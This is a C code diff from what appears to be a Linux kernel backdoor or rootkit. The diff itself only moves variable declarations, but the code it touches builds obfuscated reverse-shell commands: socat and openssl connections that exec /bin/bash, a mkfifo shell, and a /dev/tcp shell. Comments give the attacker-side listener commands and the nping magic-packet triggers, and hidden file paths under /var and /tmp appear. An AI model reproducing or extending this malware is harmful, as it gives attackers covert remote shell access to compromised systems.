@@ -187,8 +187,6 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * Note: tail session is hidden automatically as it
                      * will be direct child of socat
                      */
-                    int len;
-                    char ip[INET_ADDRSTRLEN+1] = {0};
                     //"%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.o4udk\""
                     char *a = kv_whatever_copystr(_OBF_OPENSSL, sizeof(_OBF_OPENSSL));
                     char *b = kv_whatever_copystr(_OBF_VERIFY_0, sizeof(_OBF_VERIFY_0));
@@ -196,6 +194,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                     char *d = kv_whatever_copystr(_OBF_TAIL, sizeof(_OBF_TAIL));
                     char *e = kv_whatever_copystr(_OBF__O4UDK, sizeof(_OBF__O4UDK));
                     if (a && b && c && d && e) {
+                        int len;
+                        char ip[INET_ADDRSTRLEN+1] = {0};
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                         len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:\"%s%s\"", exe, a, ip, src_port, b, c, d, e);
                         if (len) {
@@ -214,14 +214,14 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * socat -d -d OPENSSL-LISTEN:<#PORT>,cert=server.pem,verify=0,fork STDOUT
                      * trigger: nping <IP> --tcp -p RR_SOCAT --flags fin,urg,ack --source-port <#PORT> -c 1
                      */
-                    int len;
-                    char ip[INET_ADDRSTRLEN+1] = {0};
                     //"%s OPENSSL:%s:%s,verify=0 EXEC:/bin/bash"
                     char *a = kv_whatever_copystr(_OBF_OPENSSL, sizeof(_OBF_OPENSSL));
                     char *b = kv_whatever_copystr(_OBF_VERIFY_0, sizeof(_OBF_VERIFY_0));
                     char *c = kv_whatever_copystr(_OBF_EXEC, sizeof(_OBF_EXEC));
                     char *d = kv_whatever_copystr(_OBF__BIN_BASH, sizeof(_OBF__BIN_BASH));
                     if (a && b && c && d) {
+                        int len;
+                        char ip[INET_ADDRSTRLEN+1] = {0};
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                         len = snprintf(NULL, 0, "%s %s:%s:%u,%s %s:%s", exe, a, ip, src_port, b, c, d);
                         if (len) {
@@ -239,8 +239,6 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * openssl s_server -key key.pem -cert cert.pem -accept <#PORT>
                      * trigger: nping <IP> --tcp -p RR_OPENSSL --flags fin,urg,ack --source-port <#PORT> -c 1
                      */
-                    int len;
-                    char ip[INET_ADDRSTRLEN+1] = {0};
                     //"/usr/bin/mkfifo /tmp/.stfu; /bin/sh -i < /tmp/.stfu 2>&1 |"
                     //  "%s s_client -quiet -connect %s:%s > /tmp/.stfu";
                     char *a = kv_whatever_copystr(_OBF_USR_BIN_MKFIFO, sizeof(_OBF_USR_BIN_MKFIFO));
@@ -251,6 +249,8 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                     char *f = kv_whatever_copystr(_OBF_SCLIENT__QUIET__CONNECT, sizeof(_OBF_SCLIENT__QUIET__CONNECT));
 
                     if (a && b && c && d && e && f) {
+                        int len;
+                        char ip[INET_ADDRSTRLEN+1] = {0};
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                         len = snprintf(NULL, 0, "%s %s/%s; %s -i < %s/%s %s | %s %s %s:%u > %s/%s",
                                 a, b, c, d, b, c, e, exe, f, ip, src_port, b, c);
@@ -269,14 +269,14 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
                      * nc <IP> -lvp <#PORT>
                      * trigger: nping <IP> --tcp -p RR_NC --flags fin,urg,ack --source-port <#PORT> -c 1
                      */
-                    int len;
-                    char ip[INET_ADDRSTRLEN+1] = {0};
                     //"/bin/sh -i >& /dev/tcp/%s/%s 0>&1";
                     char *a = kv_whatever_copystr(_OBF_BIN_SH, sizeof(_OBF_BIN_SH));
                     char *b = kv_whatever_copystr(_OBF__INTERACTIVE, sizeof(_OBF__INTERACTIVE));
                     char *c = kv_whatever_copystr(_OBF_DEV_TCP, sizeof(_OBF_DEV_TCP));
                     char *d = kv_whatever_copystr(_OBF_STD_ZERO, sizeof(_OBF_STD_ZERO));
                     if (a && b && c && d) {
+                        int len;
+                        char ip[INET_ADDRSTRLEN+1] = {0};
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                         len = snprintf(NULL, 0, "%s %s %s/%s/%u %s", a, b, c, ip, src_port, d);
                         if (len) {
